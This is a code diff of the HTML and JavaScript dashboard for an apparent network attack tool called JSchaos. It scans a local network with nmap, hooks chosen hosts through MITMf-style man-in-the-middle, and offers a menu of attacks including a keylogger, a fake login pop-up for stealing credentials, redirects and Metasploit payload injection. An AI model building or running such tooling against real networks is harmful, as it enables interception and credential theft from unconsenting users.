@@ -1,8 +1,12 @@
 <!doctype html>
 <html>
   <head>
-   <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro" rel="stylesheet">
-   <script src="https://use.fontawesome.com/88f50d35e9.js"></script> 
+    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro" rel="stylesheet">
+    <link rel="stylesheet" href="plugins/custom-scrollbar/jquery.mCustomScrollbar.css"/>
+    <link rel="stylesheet" href="font-awesome-animation.css">
+    <script src="http://code.jquery.com/jquery-1.11.1.js"></script>
+    <script src="plugins/custom-scrollbar/jquery.mCustomScrollbar.concat.min.js"></script>
+    <script src="https://use.fontawesome.com/88f50d35e9.js"></script> 
     <title>JSchaos</title>
   </head>
   <body>
@@ -16,17 +20,30 @@
         height: 100%;
       }
 
-      #clients, #attacks{
+      #clients, #attacks, #services{
         background-color: #2A2A2A;
-        width: 443px;
+        width: 450px;
         height: 310px;
-        padding-top: 20px;
-        padding-left: 25px;
+        padding-top: 12px;
+        padding-left: 15px;
         margin-bottom: 20px;
         padding-bottom: 15px;
         overflow-y: hidden;
         position: relative;
         display: inline-block;
+        perspective: 800px;
+      }
+
+      #terminal{
+        background-color: #2A2A2A;
+        width: 100%;
+        height: 345px;
+        padding: 10px;
+        margin-bottom: 20px;
+        overflow-y: hidden;
+        position: relative;
+        display: inline-block;
+        border: none;
       }
 
       #clientsHeader {
@@ -42,11 +59,40 @@
 
       .client, .attack {
         position: relative;
-        background-color: white;
+        background-color: #e9e9e9;
         height: 70px;
         border-radius: 5px;
         width: 420px;
         margin-bottom: 10px;
+        transform-style: preserve-3d;
+        transition: transform 0.5s;
+      }
+
+      .client figure{
+        backface-visibility: hidden;
+      }
+
+      .client > .front {
+        position: absolute;
+        height: 70px;
+        border-radius: 5px;
+        width: 420px;
+        background-color: #e9e9e9;
+        margin:0 auto;
+      }
+
+      .client > .back{
+        position: absolute;
+        height: 70px;
+        border-radius: 5px;
+        width: 420px;
+        background-color: white;
+        margin:0 auto;
+        transform: rotateX( 180deg );
+      }
+
+      .client.flipped{
+        transform: rotateX( 180deg );
       }
 
       #status{
@@ -116,6 +162,15 @@
         margin-left:10px;
       }
 
+      #terminalContainer{
+        position: absolute;
+        display: inline;
+        left: 10px;
+        right: 30px;
+        width: auto;
+        height: auto;
+      }
+
       .header{
         width: 100%;
         left: 0px;
@@ -162,9 +217,11 @@
 
     </style>
 
-    <div class="header"> 
-      <img id="logo" src="node.png"/><div id="logoLabel">PNSMN</div>
-    </div>
+  <div class="header"> 
+    <img id="logo" src="node.png"/><div id="logoLabel">PNSMN</div>
+  </div>
+
+  <div id="widgets">
 
     <div id="container">
       <div id="clients">
@@ -172,89 +229,135 @@
       </div>
     </div>
 
-  <div id="container">
-    <div id="attacks">
-    <div id="empty">ATTACKS ARE NOT AVAILABLE<br><i class="fa fa-info-circle" aria-hidden="true"></i> </div>
-      <div class="attack">
-          <div id="status">
-            <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></i></div>
-            <div id="attackTitle">Toggle alert box</div>
-            <div id="attackDescription">Displays an alert box on the client's webppage</div>
-          </div>
+    <div id="container">
+      <div id="attacks">
+      <div id="empty">SERVICES ARE NOT AVAILABLE<br><i class="fa fa-info-circle" aria-hidden="true"></i> </div>
+        <div class="attack">
+            <div id="status">
+              <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></i></div>
+              <div id="attackTitle">Toggle alert box</div>
+              <div id="attackDescription">Displays an alert box on the client's webppage</div>
+            </div>
+        </div>
+        <div class="attack">
+            <div id="status">
+              <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
+              <div id="attackTitle">Redirect</div>
+              <div id="attackDescription">Redirects the client to a specific page</div>
+            </div>
+        </div>
+        <div class="attack">
+            <div id="status">
+              <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
+              <div id="attackTitle">Replace Text</div>
+              <div id="attackDescription">Replaces text on the client's webpage</div>
+            </div>
+        </div>
+        <div class="attack">
+            <div id="status">
+              <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
+              <div id="attackTitle">Keylogger</div>
+              <div id="attackDescription">Get client's keyboard input</div>
+            </div>
+        </div>
+        <div class="attack">
+            <div id="status">
+              <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
+              <div id="attackTitle">Pop-up thief</div>
+              <div id="attackDescription">Displays a fake login pop-up on the client's webpage</div>
+            </div>
+        </div>
+        <div class="attack">
+            <div id="status">
+              <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
+              <div id="attackTitle">Inject payload</div>
+              <div id="attackDescription">Inject metasploit payload on the client's machine</div>
+            </div>
+        </div>
       </div>
-      <div class="attack">
-          <div id="status">
-            <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
-            <div id="attackTitle">Redirect</div>
-            <div id="attackDescription">Redirects the client to a specific page</div>
-          </div>
-      </div>
-      <div class="attack">
-          <div id="status">
-            <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
-            <div id="attackTitle">Replace Text</div>
-            <div id="attackDescription">Replaces text on the client's webpage</div>
-          </div>
-      </div>
-      <div class="attack">
-          <div id="status">
-            <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
-            <div id="attackTitle">Keylogger</div>
-            <div id="attackDescription">Get client's keyboard input</div>
-          </div>
-      </div>
-      <div class="attack">
-          <div id="status">
-            <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
-            <div id="attackTitle">Pop-up thief</div>
-            <div id="attackDescription">Displays a fake login pop-up on the client's webpage</div>
-          </div>
-      </div>
-      <div class="attack">
-          <div id="status">
-            <div id="statusLabel"><i class="fa fa-upload" aria-hidden="true"></i></div>
-            <div id="attackTitle">Inject payload</div>
-            <div id="attackDescription">Inject metasploit payload on the client's machine</div>
-          </div>
+    </div>
+
+    <div id="container">
+      <div id="services">
+        <div id="empty">NO SERVICE SELECTED<br><i class="fa fa-bomb" aria-hidden="true"></i></div>
       </div>
     </div>
   </div>
 
-  <div id="container">
-    <div id="clients">
-      <div id="empty">NO ATTACK SELECTED<br><i class="fa fa-bomb" aria-hidden="true"></i></div>
-    </div>
+  <div id="terminalContainer">
+   <iframe id="terminal" src="/termEmbed.html"></iframe> 
   </div>
 
   </body>
 </html>
 <script src="/socket.io/socket.io.js"></script>
-<script src="http://code.jquery.com/jquery-1.11.1.js"></script>
 <script>
 
   var socket = io();
 
   socket.on('display_client', function(data){
-    var slicedId = data.id.slice(2);
-    var htmlClient =     '<div class="client" id="'+slicedId+'">'+
-                            '<div id="status">'+
-                              '<div id="statusLabel"><i class="fa fa-link" aria-hidden="true"></i></div>'+
-                              '<div id="request">'+data.os+'</div>'+
-                              '<div id="ip">'+data.ip+'</div>'+
-                            '</div>'+
-                            '<div id="attack" onclick=\'sendQuery()\'>Attack Client</div>'+
-                          '</div>';
-
-    $("#clients").append(htmlClient);
-    $("#empty").empty();
-
+      $('.flipped #status #statusLabel').html('<i class="fa fa-link" aria-hidden="true"></i>');
+      $('.flipped #attack').html('UnHook');
+      $("#attacks #empty").empty();
+      $('.attack').show();
+      $("#attacks").mCustomScrollbar({
+        theme:"light-thin"
+      });
   });
 
   socket.on('hide_client', function(data){
-    var slicedId = data.id.slice(2);
-    var emptyID = "#"+slicedId;
-    $(".client"+emptyID).remove();
-    $(emptyID).empty();
+      $('.flipped #status #statusLabel').html('<i class="fa fa-circle-o-notch faa-spin animated" aria-hidden="true"></i>');
   });
+
+  socket.on('nmap', function(data){
+    var ip,mac,name,htmlClient,temp;
+    json = JSON.parse(data);
+    for(var i=0;i<json.length;i++){
+
+      ip = json[i]['address'][0]["$"]["addr"];
+
+      if(json[i]['hostnames'][0].hasOwnProperty('hostname')){
+       mac = json[i]['hostnames'][0]['hostname'][0]['$']['name'];
+      }else{
+        mac="anonymous";
+      }
+
+      htmlClient = 
+      '<div class="client" id="'+ip.split('.').join("")+'">'+
+        '<figure class="front">'+
+          '<div id="status">'+
+            '<div id="statusLabel"><i class="fa fa-wifi" aria-hidden="true"></i></div>'+
+            '<div id="request">'+ip+'</div>'+
+            '<div id="ip">'+mac+'</div>'+
+          '</div>'+
+          '<div id="attack" onclick=\'hookClient("'+ip+'")\'>Hook</div>'+
+        '</figure>'+
+        '<figure class="back">'+
+          '<div id="status">'+
+            '<div id="statusLabel"><i class="fa fa-circle-o-notch faa-spin animated" aria-hidden="true"></i></div>'+
+            '<div id="request">'+ip+'</div>'+
+            '<div id="ip">'+mac+'</div>'+
+          '</div>'+
+          '<div id="attack" onclick=\'hookClient("'+ip+'")\'>Hook</div>'+
+        '</figure>'+
+      '</div>';
+
+      $("#clients").append(htmlClient);
+      $("#empty").empty();
+
+    }
+
+    $("#clients").mCustomScrollbar({
+        theme:"light-thin"
+    });
+
+  });
+
+  function hookClient(ip){
+    socket.emit('mitmf_client',{'ip':ip});
+    $('#'+ip.split('.').join("")).addClass("flipped");
+  }
+
+  socket.emit('scan_network',{'handle':'none'});
 
 </script>
